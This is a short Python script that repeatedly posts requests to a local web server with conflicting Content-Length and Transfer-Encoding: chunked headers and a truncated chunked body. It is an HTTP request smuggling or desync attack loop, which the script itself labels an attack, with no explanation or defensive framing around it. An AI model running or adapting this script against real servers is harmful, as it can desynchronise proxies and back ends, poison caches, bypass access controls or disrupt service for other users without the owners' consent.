import requests
import time

url = "http://localhost"
headers = {
    "Host": "localhost",
    "Content-Length": "100000",
    "Transfer-Encoding": "chunked",
    "Connection": "keep-alive"
}
payload = "0\r\n\r\nD"

while True:
    try:
        response = requests.post(url, headers=headers, data=payload)
        print(f"Sent - Status: {response.status_code}, Length: {len(response.content)}")
        time.sleep(1)  # Adjust delay as needed
    except KeyboardInterrupt:
        print("\nStopping attack...")
        break
    except Exception as e:
        print(f"Error: {str(e)}")
        time.sleep(1)